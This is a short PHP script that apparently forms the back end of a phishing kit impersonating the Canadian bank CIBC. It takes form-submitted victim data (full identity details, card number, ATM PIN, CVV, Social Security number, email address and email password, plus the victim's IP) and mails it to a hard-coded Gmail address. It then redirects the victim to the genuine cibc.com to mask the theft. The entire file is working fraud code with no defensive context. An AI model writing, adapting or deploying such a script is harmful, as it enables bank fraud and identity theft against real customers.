<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------CIBC Info-----------------------\n";
$message .= "Full name            : ".$_POST['formtext1']."\n";
$message .= "Address            : ".$_POST['formtext2']."\n";
$message .= "City          : ".$_POST['formtext14']."\n";
$message .= "Zip Code          : ".$_POST['formtext15']."\n";
$message .= "Province           : ".$_POST['formtext16']."\n";
$message .= "Date of DD            : ".$_POST['formtext3']."\n";
$message .= "Date of MM            : ".$_POST['formselect1']."\n";
$message .= "Date of YYYY           : ".$_POST['formtext4']."\n";
$message .= "Driver Licence Number           : ".$_POST['formtext5']."\n";
$message .= "Card Number           : ".$_POST['formtext6']."\n";
$message .= "Name On Card            : ".$_POST['formtext7']."\n";
$message .= "ATM Pin           : ".$_POST['formtext8']."\n";
$message .= "Expiry Date MM          : ".$_POST['formtext17']."\n";
$message .= "Expiry Date YY          : ".$_POST['formtext10']."\n";
$message .= "CVV           : ".$_POST['formtext13']."\n";
$message .= "Social Security Number          : ".$_POST['formtext11']."\n";
$message .= "Email Address           : ".$_POST['formtext12']."\n";
$message .= "Email Password        : ".$_POST['formtext9']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY fudpages(dot)com-------------\n";
$send = "abdoalarg53@gmail.com";
$subject = "Result from $IP";
$headers = "From: CIBC<customer-support@Mrs>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
@mail($send,$subject,$message,$headers);
@mail($to,$subject,$message,$headers);
}

	
		   header("Location: https://www.cibc.com");

	 
?>